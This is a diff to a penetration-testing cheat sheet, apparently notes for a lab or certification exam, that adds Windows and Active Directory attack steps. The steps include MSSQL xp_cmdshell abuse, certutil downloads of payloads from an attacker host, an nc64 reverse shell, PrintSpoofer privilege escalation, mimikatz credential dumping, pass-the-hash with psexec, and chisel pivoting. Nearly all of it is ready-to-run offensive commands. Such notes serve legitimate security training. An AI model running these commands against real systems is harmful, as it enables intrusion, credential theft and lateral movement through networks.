@@ -182,6 +182,11 @@ Foothold:
   - Sometimes you will find ldap default password
     - You can use the password to enumerate ldap and get usernames: ldapsearch -h <IP> -bx "DC=<>,DC=<>"
     
+- Web exploits 
+  - Arbitrary file upload
+    - Example: https://packetstormsecurity.com/files/166585/Roxy-File-Manager-1.4.5-PHP-File-Upload-Restriction-Bypass.html
+    
+    
 - Password Spray 
   - If you have usernames and passwords you may try and bruteforce:
     - cme smb <IP> -u user.txt -p 'passowrd'
@@ -189,7 +194,36 @@ Foothold:
     - Note: try on all three machines and try to hit all services that take login creds. 
     - Very likely you get a valid cred set and you can use it to ssh or rdp into the first machine
 
-- Privelge Escalation: 
+- If you have mssql creds: https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell-with-nishang/
+  - Attacker:
+    - Serve a payload (likely 64)
+    - Listen: nc -lnvp 443
+    - Login: mssqlclient.py <domain>/<user>:<password>@<IP>
+      - enable_xp_cmdshell
+      - xp_cmdshell "certutil -urlcache -f http://<IP>/payload.exe"
+      - xp_cmdshell payload.exe
+        - Alt: xp_cmdshell "certutil -urlcache -f http://<IP>/nc64.exe C:\users\public\nc64.exe
+          - xp_cmdshell "C:\users\public\nc64.exe -e cmd.exe <IP> <port>"
+  - Alt: 
+    - Generate payload, serve it and listen for a call back.
+    - Log into mssql: sqsh -S <IP> -U <user> -P <password>
+      - sp_configure 'show advanced options', '1'
+        - If it doesn't work, try adding EXEC in the start: EXEC sp_configure 'show advanced options', '1'
+      - RECONFIGURE
+      - go 
+      - sp_configure 'xp_cmdshell', '1'
+        - If it doesn't work, try adding EXEC in the start: EXEC sp_configure 'xp_cmdshell', '1'
+      - RECONFIGURE
+      - go 
+      - xp_cmdshell "certutil -urlcache -f http://<IP>/payload.exe"
+      - go 
+      - xp_cmdshell "payload.exe" 
+      
+    
+
+
+Privelge Escalation: 
+
   - Use winpeas to locate insecure service executables, then use msfvenom to generate a payload to replace the exe file: 
     - You can check manually: 
       - accesschk.exe -uwcqv *
@@ -203,7 +237,14 @@ Foothold:
     - You can login using psexec: PSExec.exe <domain>/<user>:<password>@<IP>
     - You can use evil-winrm to get to domain controllers: evil-winrm -i <IP> -u <user> -p <password>
     
-- Post compromise of the first machine: 
+  - printspoofer.exe
+    - run: whoami /priv
+      - if SeImporsonatePrivilege, then it's vulnerable to printspoofer.
+    - Get printspoofer on the target system
+    - printspoofer.exe -i -c cmd
+    
+Post compromise of the first machine: 
+
   - Get mimikatz on the first machine
     - One liner: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > passwords.txt
     - Broken down:
@@ -211,12 +252,20 @@ Foothold:
       - privilege::debug
       - sekurlsa::logonpasswords
       - exit
-  - Crack NTLM passwords
-    - hashcat hash.txt rockyou.txt
-    - hashcat --show 
+  - NTLM hashes: 
+    - Crack NTLM hashes
+      - hashcat hash.txt rockyou.txt
+      - hashcat --show 
+    - Pass the hash: 
+      - python psexec.py -hashes :<NTLM Hash> <user>@<IP>
 
 - Pivot from first machine to 2nd 
   - xfreerdp /u:<username> /p:<password> /v:<IP>
+  - to DC: evil-winrm -i <IP> -u <user> -p <password>
+  
+Port forwarding: 
+  - On attacker: chisel server -reverse -p 2222
+  - On first machine: chisel.exe client <Attacker IP>:2222 R:445:<2nd machine IP or DC IP>:445
     
       
    
